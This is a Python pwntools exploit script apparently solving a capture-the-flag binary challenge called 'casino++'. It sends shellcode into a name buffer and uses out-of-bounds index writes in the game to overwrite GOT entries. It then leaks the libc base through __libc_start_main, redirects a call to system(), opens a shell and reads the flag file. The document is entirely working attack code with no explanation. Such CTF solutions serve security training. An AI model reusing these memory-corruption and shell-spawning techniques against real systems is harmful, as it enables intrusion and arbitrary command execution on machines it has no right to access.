#!/usr/bin/env python
from pwn import *

l = ELF( 'libc-2.27.so' )

context.arch = 'amd64'
#y = remote( 'edu-ctf.csie.org' , 10176 )
y = remote( 'localhost' , 10176 )
#y = process( '../casino++/share/casino++' )

def casino( ans , idx , num ):
    for i in ans:
        y.sendlineafter( ':' , str( i ) )
    y.sendlineafter( ']: ' , '1' )
    y.sendlineafter( ': ' , str( idx ) )
    y.sendlineafter( ': ' , str( num ) )


lose = [0] * 6
win = [61,68,32,22,69,20]

name = 0x6020f0

y.sendafter( ':' , '\0' * 0x10 + p64( 0x601ff0 ) + p64( 0 ) + asm( shellcraft.sh() ) )
y.sendafter( ':' , '27' )

casino( lose , -42 , 0 )
casino( win , -43 , 0x40095d ) # casino()

casino( lose , -34 , 0 )
casino( win , -35 , 0x4006e6 )

l.address = u64( y.recv(6) + '\0\0' ) - l.sym.__libc_start_main
success( 'libc -> %s' % hex( l.address ) )

win = [22,67,58,53,74,3]
one = l.address + 0x10a38c

casino( lose , -42 , 0 )
casino( win , -43 , 0x40095d ) # casino()

casino( lose , -29 , l.sym.system & 0xffffffff ) # system()

y.sendafter( ': ' , 'sh\n' )

sleep( 0.3 )
y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()